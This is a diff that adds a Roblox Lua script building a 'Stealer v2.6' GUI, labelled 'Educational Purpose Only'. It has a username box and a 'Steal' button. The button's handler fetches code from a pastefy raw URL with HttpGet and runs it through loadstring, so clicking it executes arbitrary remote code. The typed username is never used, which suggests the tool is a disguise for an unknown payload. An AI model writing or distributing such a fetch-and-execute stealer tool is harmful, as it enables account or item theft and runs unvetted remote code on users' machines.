@@ -1,0 +1,56 @@
+-- Educational Purpose Only GUI
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "StealerGUI"
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "Stealer v2.6"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 24
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+-- Input TextBox
+local inputBox = Instance.new("TextBox")
+inputBox.PlaceholderText = "Input User!"
+inputBox.Text = ""
+inputBox.Size = UDim2.new(0.8, 0, 0, 40)
+inputBox.Position = UDim2.new(0.1, 0, 0, 60)
+inputBox.Font = Enum.Font.SourceSans
+inputBox.TextSize = 18
+inputBox.TextColor3 = Color3.new(0, 0, 0)
+inputBox.Parent = frame
+
+-- Steal Button
+local stealButton = Instance.new("TextButton")
+stealButton.Text = "Steal"
+stealButton.Size = UDim2.new(0.5, 0, 0, 40)
+stealButton.Position = UDim2.new(0.25, 0, 0, 120)
+stealButton.Font = Enum.Font.SourceSansBold
+stealButton.TextSize = 20
+stealButton.TextColor3 = Color3.new(1, 1, 1)
+stealButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+stealButton.Parent = frame
+
+-- Button Function
+stealButton.MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/i0Vl9spw/raw"))()
+    end)
+    if not success then
+        warn("Failed to execute script: ", result)
+    end
+end)
